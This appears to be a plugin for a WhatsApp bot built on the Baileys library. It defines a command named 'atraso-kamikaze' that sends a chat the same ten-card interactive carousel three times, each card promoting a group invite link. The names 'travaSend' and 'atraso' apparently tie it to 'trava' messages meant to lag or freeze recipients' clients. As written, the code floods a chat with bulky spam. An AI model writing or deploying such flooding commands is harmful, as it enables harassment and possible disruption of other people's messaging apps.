import { prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => {
  const imagePath = './src/foto.jpg';
  const groupLink = 'https://chat.whatsapp.com/D1IJDyndCxTIiYfvmaavCE';
  const target = m.chat;
  const travaSend = 3;

  const media = await prepareWAMessageMedia({ image: { url: imagePath } }, { upload: conn.waUploadToServer });

  const makeCard = () => ({
    header: {
      ...media.imageMessage,
      title: `¡Únete ahora!`,
      subtitle: "Haz clic abajo",
      hasMediaAttachment: true
    },
    body: {
      text: "🎠 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛"
    },
    nativeFlowMessage: {
      buttons: [{
        name: "cta_url",
        buttonParamsJson: JSON.stringify({
          display_text: "Unirme 🚪",
          url: groupLink,
          merchant_url: groupLink
        })
      }]
    }
  });

  const cards = Array.from({ length: 10 }, makeCard);

  const msg = generateWAMessageFromContent(target, {
    interactiveMessage: {
      body: {
        text: "🎠 𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛\n\nDesliza para ver más opciones."
      },
      carouselMessage: { cards }
    }
  }, { userJid: conn.user.id });

  for (let i = 0; i < travaSend; i++) {
    await conn.relayMessage(target, msg.message, { messageId: generateMessageID() });
  }
};

handler.command = ['atraso-kamikaze'];
export default handler;